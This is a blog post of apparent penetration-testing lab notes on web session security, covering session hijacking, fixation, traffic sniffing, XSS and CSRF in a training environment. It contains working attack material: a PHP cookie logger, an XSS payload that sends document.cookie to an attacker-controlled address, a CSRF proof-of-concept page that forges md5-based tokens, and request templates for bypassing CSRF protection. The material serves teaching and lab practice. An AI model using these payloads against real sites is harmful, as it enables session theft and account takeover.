---
title: Session Security
date: 2024-02-18 20:00 
categories: [HTTP]
tags: [SMB, RFI, RCE, PHP, FTP, Reverse Shell]
author: jamarapo
---

## Session Identifier Security
The sessions of a user are recorded with a Unique Session Identifier or an access token. If an attacker gains any of these can do a hijacking attack where the attacker has access to a session of a victim without authentication and uses victim authorization rights.

An attacker can obtain the session identifier with multiple methods: packing sniffing, identifying logs, prediction, and brute force.

The security of a session identifier depends on three factors:
- Validity Scop: The identifier must be valid for one session only.
- Randomness: The string of the identifier must use a solid random generation algorithm.
- Validity Time: The effective time of the identifier must have a period with expiration.
  
Sites where is stored the session identifiers:

- HTTP Referer header: The Referer header can expose a session identifier to other websites. Also, any session identifier in the URL can be seen in the browser's history.

- HTML: Session identifiers can be found in the browser's cache and in any intermediary proxies.

- SessionStorage: SessionStorage, an HTML5 feature, holds session identifiers until the tab or browser is closed. Data in SessionStorage is cleared when the page session ends, but it persists across page reloads.

- LocalStorage: LocalStorage, another HTML5 feature, retains session identifiers until deleted by the user. It survives browser process termination but is cleared in "private browsing" or "incognito" sessions when the last tab is closed.

### Session Attacks
**Session Hijacking**: Attackers exploit insecure session identifiers to gain unauthorized access to a user's session and impersonate them on a server.

**Session Fixation**: Attackers set a valid session identifier for a victim, tricking them into using it to log in. This allows the attacker to hijack the session.

**XSS (Cross-Site Scripting)**: Allows attackers to inject malicious scripts into web pages viewed by other users, potentially compromising their sessions.

**CSRF (Cross-Site Request Forgery)**: Forces authenticated users to unknowingly execute malicious actions on a web application, using their session identity.

**Open Redirects**: Attackers abuse a legitimate application's redirection functionality to redirect users to malicious sites, potentially compromising their sessions.

## Lab 1

![alt text](/assets/img/posts/SessionSecurity/image-2.png)

![alt text](/assets/img/posts/SessionSecurity/image-3.png)

![alt text](/assets/img/posts/SessionSecurity/image-4.png)

Using the cookie we can access to account without authenticate.

![alt text](/assets/img/posts/SessionSecurity/image-5.png)


## Session Fixation

Stage 1: At this stage, the attacker acquires a valid session identifier from the targeted application. In many cases, applications issue session identifiers to any user who accesses them, even without authentication. This means attackers can obtain a valid session identifier without needing to log in. Alternatively, attackers may create an account on the application to obtain a valid session identifier if account creation is possible.

Stage 2: Once the attacker has a valid session identifier, they may exploit a session fixation vulnerability. This occurs when the session identifier assigned to a user before logging in remains the same after logging in. If the application accepts session identifiers from URL query strings or post data, the attacker can manipulate these parameters to fixate a session. For instance, if a session-related parameter is part of the URL instead of the cookie header, the attacker can manipulate it to fixate the session.

Stage 3: In the final stage, the attacker lures the victim into using the session identifier fixed in the previous stage. This is accomplished by crafting a URL containing the manipulated session identifier and persuading the victim to visit it. When the victim accesses the URL, the application assigns the fixed session identifier to them. As a result, the attacker gains control over the victim's session. With the session identifier already known, the attacker can proceed with session hijacking attacks, exploiting the compromised session to perform unauthorized actions on behalf of the victim.

## Lab 2

![alt text](/assets/img/posts/SessionSecurity/image-6.png)

![alt text](/assets/img/posts/SessionSecurity/image-7.png)

![alt text](/assets/img/posts/SessionSecurity/image-8.png)

Sending this URL to the victim we can access to his account with a predifined session identifier controled by the attacker. This is posible because the cookie do not change post authentication.

### HttpOnly
 Is a flag that can be set on an HTTP cookie. When this flag is set on a cookie, it instructs the web browser that the cookie should not be accessible via JavaScript in the browser. In other words, the cookie will only be sent to the server with HTTP requests, but it cannot be accessed from client-side scripts such as JavaScript.

This security measure helps mitigate the risk of script-based cookie hijacking attacks, as it prevents an attacker from accessing the user's sensitive cookies through scripting vulnerabilities in the browser. Cookies with the "HttpOnly" flag are useful for protecting confidential information, such as session tokens or authentication credentials.

In summary, by setting the "HttpOnly" flag on a cookie:

- It prevents client-side scripts, such as JavaScript, from accessing the cookie.
- The cookie will only be sent to the server with HTTP requests, maintaining the security of sensitive information contained within the cookie.

## Obtaining Session Identifiers via Traffic Sniffing

Traffic sniffing is commonly employed by penetration testers to assess network security from within. By connecting their laptops or Raspberry Pis to available Ethernet sockets, testers can monitor network traffic, gaining insight into the traffic flow and potential attack targets. This technique necessitates both the attacker and victim being on the same local network, as HTTP traffic can only be inspected in this scenario. Remote traffic sniffing is not feasible.

HTTP traffic is particularly vulnerable to sniffing because it is transmitted unencrypted, allowing attackers to intercept sensitive data like usernames, passwords, and session identifiers. Encryption via SSL or IPsec significantly complicates or renders impossible the interception of such data.

In summary, obtaining session identifiers through traffic sniffing requires:

- The attacker and victim to be on the same local network.
- Unencrypted HTTP traffic.

Various packet sniffing tools exist, with Wireshark being a popular choice. Wireshark includes filtering capabilities for specific protocols such as HTTP, SSH, and FTP, as well as filtering by source IP address.
  
## Lab 3

![alt text](/assets/img/posts/SessionSecurity/image-2.png)

![alt text](/assets/img/posts/SessionSecurity/image-9.png)

![alt text](/assets/img/posts/SessionSecurity/image-3.png)

## Cross-Site Scripting (XSS)

XSS vulnerabilities are prevalent in web applications and allow attackers to execute arbitrary JavaScript code in a victim's browser. If exploited alongside other vulnerabilities, XSS can lead to complete compromise of a web application. However, in this context, we'll focus on exploiting XSS vulnerabilities specifically to obtain valid session identifiers, such as session cookies.

To exploit XSS for session cookie leakage, the following conditions must be met:

- Session cookies must be included in all HTTP requests.
- Session cookies must be accessible to JavaScript code, meaning the HTTPOnly attribute is absent.

![alt text](/assets/img/posts/SessionSecurity/image-10.png)

![alt text](/assets/img/posts/SessionSecurity/image-12.png)

![alt text](/assets/img/posts/SessionSecurity/image-11.png)

![alt text](/assets/img/posts/SessionSecurity/image-13.png)

### Part 2

``` php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

```

``` javascript
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>

```

![alt text](/assets/img/posts/SessionSecurity/image-14.png)

![alt text](/assets/img/posts/SessionSecurity/image-16.png)


![alt text](/assets/img/posts/SessionSecurity/image-15.png)

## Exploiting CSRF Tokens

Web applications may not use secure generation token algorits like md5(username), if a attaker create a account a same username, he can be able to guess the algorithm of token.


![alt text](/assets/img/posts/SessionSecurity/image-17.png)

![alt text](/assets/img/posts/SessionSecurity/image-18.png)

### Part 2
``` html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="referrer" content="never">
    <title>Proof-of-concept</title>
    <link rel="stylesheet" href="styles.css">
    <script src="./md5.min.js"></script>
</head>

<body>
    <h1> Click Start to win!</h1>
    <button class="button" onclick="trigger()">Start!</button>

    <script>
        let host = 'http://csrf.htb.net'

        function trigger(){
            // Creating/Refreshing the token in server side.
            window.open(`${host}/app/change-visibility`)
            window.setTimeout(startPoc, 2000)
        }

        function startPoc() {
            // Setting the username
            let hash = md5("crazygorilla983")

            window.location = `${host}/app/change-visibility/confirm?csrf=${hash}&action=change`
        }
    </script>
</body>
</html>
```

``` javascript
!function(n){"use strict";function d(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function f(n,t,r,e,o,u){return d((u=d(d(t,n),d(e,u)))<<o|u>>>32-o,r)}function l(n,t,r,e,o,u,c){return f(t&r|~t&e,n,t,o,u,c)}function g(n,t,r,e,o,u,c){return f(t&e|r&~e,n,t,o,u,c)}function v(n,t,r,e,o,u,c){return f(t^r^e,n,t,o,u,c)}function m(n,t,r,e,o,u,c){return f(r^(t|~e),n,t,o,u,c)}function c(n,t){var r,e,o,u;n[t>>5]|=128<<t%32,n[14+(t+64>>>9<<4)]=t;for(var c=1732584193,f=-271733879,i=-1732584194,a=271733878,h=0;h<n.length;h+=16)c=l(r=c,e=f,o=i,u=a,n[h],7,-680876936),a=l(a,c,f,i,n[h+1],12,-389564586),i=l(i,a,c,f,n[h+2],17,606105819),f=l(f,i,a,c,n[h+3],22,-1044525330),c=l(c,f,i,a,n[h+4],7,-176418897),a=l(a,c,f,i,n[h+5],12,1200080426),i=l(i,a,c,f,n[h+6],17,-1473231341),f=l(f,i,a,c,n[h+7],22,-45705983),c=l(c,f,i,a,n[h+8],7,1770035416),a=l(a,c,f,i,n[h+9],12,-1958414417),i=l(i,a,c,f,n[h+10],17,-42063),f=l(f,i,a,c,n[h+11],22,-1990404162),c=l(c,f,i,a,n[h+12],7,1804603682),a=l(a,c,f,i,n[h+13],12,-40341101),i=l(i,a,c,f,n[h+14],17,-1502002290),c=g(c,f=l(f,i,a,c,n[h+15],22,1236535329),i,a,n[h+1],5,-165796510),a=g(a,c,f,i,n[h+6],9,-1069501632),i=g(i,a,c,f,n[h+11],14,643717713),f=g(f,i,a,c,n[h],20,-373897302),c=g(c,f,i,a,n[h+5],5,-701558691),a=g(a,c,f,i,n[h+10],9,38016083),i=g(i,a,c,f,n[h+15],14,-660478335),f=g(f,i,a,c,n[h+4],20,-405537848),c=g(c,f,i,a,n[h+9],5,568446438),a=g(a,c,f,i,n[h+14],9,-1019803690),i=g(i,a,c,f,n[h+3],14,-187363961),f=g(f,i,a,c,n[h+8],20,1163531501),c=g(c,f,i,a,n[h+13],5,-1444681467),a=g(a,c,f,i,n[h+2],9,-51403784),i=g(i,a,c,f,n[h+7],14,1735328473),c=v(c,f=g(f,i,a,c,n[h+12],20,-1926607734),i,a,n[h+5],4,-378558),a=v(a,c,f,i,n[h+8],11,-2022574463),i=v(i,a,c,f,n[h+11],16,1839030562),f=v(f,i,a,c,n[h+14],23,-35309556),c=v(c,f,i,a,n[h+1],4,-1530992060),a=v(a,c,f,i,n[h+4],11,1272893353),i=v(i,a,c,f,n[h+7],16,-155497632),f=v(f,i,a,c,n[h+10],23,-1094730640),c=v(c,f,i,a,n[h+13],4,681279174),a=v(a,c,f,i,n[h],11,-358537222),i=v(i,a,c,f,n[h+3],16,-722521979),f=v(f,i,a,c,n[h+6],23,76029189),c=v(c,f,i,a,n[h+9],4,-640364487),a=v(a,c,f,i,n[h+12],11,-421815835),i=v(i,a,c,f,n[h+15],16,530742520),c=m(c,f=v(f,i,a,c,n[h+2],23,-995338651),i,a,n[h],6,-198630844),a=m(a,c,f,i,n[h+7],10,1126891415),i=m(i,a,c,f,n[h+14],15,-1416354905),f=m(f,i,a,c,n[h+5],21,-57434055),c=m(c,f,i,a,n[h+12],6,1700485571),a=m(a,c,f,i,n[h+3],10,-1894986606),i=m(i,a,c,f,n[h+10],15,-1051523),f=m(f,i,a,c,n[h+1],21,-2054922799),c=m(c,f,i,a,n[h+8],6,1873313359),a=m(a,c,f,i,n[h+15],10,-30611744),i=m(i,a,c,f,n[h+6],15,-1560198380),f=m(f,i,a,c,n[h+13],21,1309151649),c=m(c,f,i,a,n[h+4],6,-145523070),a=m(a,c,f,i,n[h+11],10,-1120210379),i=m(i,a,c,f,n[h+2],15,718787259),f=m(f,i,a,c,n[h+9],21,-343485551),c=d(c,r),f=d(f,e),i=d(i,o),a=d(a,u);return[c,f,i,a]}function i(n){for(var t="",r=32*n.length,e=0;e<r;e+=8)t+=String.fromCharCode(n[e>>5]>>>e%32&255);return t}function a(n){var t=[];for(t[(n.length>>2)-1]=void 0,e=0;e<t.length;e+=1)t[e]=0;for(var r=8*n.length,e=0;e<r;e+=8)t[e>>5]|=(255&n.charCodeAt(e/8))<<e%32;return t}function e(n){for(var t,r="0123456789abcdef",e="",o=0;o<n.length;o+=1)t=n.charCodeAt(o),e+=r.charAt(t>>>4&15)+r.charAt(15&t);return e}function r(n){return unescape(encodeURIComponent(n))}function o(n){return i(c(a(n=r(n)),8*n.length))}function u(n,t){return function(n,t){var r,e=a(n),o=[],u=[];for(o[15]=u[15]=void 0,16<e.length&&(e=c(e,8*n.length)),r=0;r<16;r+=1)o[r]=909522486^e[r],u[r]=1549556828^e[r];return t=c(o.concat(a(t)),512+8*t.length),i(c(u.concat(t),640))}(r(n),r(t))}function t(n,t,r){return t?r?u(t,n):e(u(t,n)):r?o(n):e(o(n))}"function"==typeof define&&define.amd?define(function(){return t}):"object"==typeof module&&module.exports?module.exports=t:n.md5=t}(this);
```

![alt text](/assets/img/posts/SessionSecurity/image-19.png)

![alt text](/assets/img/posts/SessionSecurity/image-20.png)

![alt text](/assets/img/posts/SessionSecurity/image-21.png)

![alt text](/assets/img/posts/SessionSecurity/image-22.png)

## Additional CSRF Protection Bypasses

Even though diving deeper into CSRF protection bypasses is out of this module's scope, find below some approaches that may prove helpful during engagements or bug bounty hunting.
Null Value

You can try making the CSRF token a null value (empty), for example:

### CSRF-Token:

This may work because sometimes, the check is only looking for the header, and it does not validate the token value. In such cases, we can craft our cross-site requests using a null CSRF token, as long as the header is provided in the request.
Random CSRF Token

Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.

#### Real:

CSRF-Token: 9cfffd9e8e78bd68975e295d1b3d3331

#### Fake:

CSRF-Token: 9cfffl3dj3837dfkj3j387fjcxmfjfd3
Use Another Session’s CSRF Token

Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.

Create two accounts and log into the first account. Generate a request and capture the CSRF token. Copy the token's value, for example, CSRF-Token=9cfffd9e8e78bd68975e295d1b3d3331.

Log into the second account and change the value of CSRF-Token to 9cfffd9e8e78bd68975e295d1b3d3331 while issuing the same (or a different) request. If the request is issued successfully, we can successfully execute CSRF attacks using a token generated through our account that is considered valid across multiple accounts.
Request Method Tampering

To bypass anti-CSRF protections, we can try changing the request method. From POST to GET and vice versa.

For example, if the application is using POST, try changing it to GET:
Code: http

POST /change_password
POST body:
new_password=pwned&confirm_new=pwned

Code: http

GET /change_password?new_password=pwned&confirm_new=pwned

Unexpected requests may be served without the need for a CSRF token.
Delete the CSRF token parameter or send a blank token

Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank.

Real Request:
Code: http

POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331

Try:
Code: http

POST /change_password
POST body:
new_password=qwerty

Or:
Code: http

POST /change_password
POST body:
new_password=qwerty&csrf_token=

Session Fixation > CSRF

Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.

If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.

If this is the case and a session fixation vulnerability exists, an attacker could perform a successful CSRF attack as follows:

### Steps:

    Session fixation
    Execute CSRF with the following request:

Code: http

POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token

Anti-CSRF Protection via the Referrer Header

If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script.

<meta name="referrer" content="no-referrer"
Bypass the Regex

Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain.

Let us suppose that the Referrer Header is checking for google.com. We could try something like www.google.com.pwned.m3, which may bypass the regex! If it uses its own domain (target.com) as a whitelist, try using the target domain as follows www.target.com.pwned.m3.

You can try some of the following as well:

www.pwned.m3?www.target.com or www.pwned.m3/www.target.com
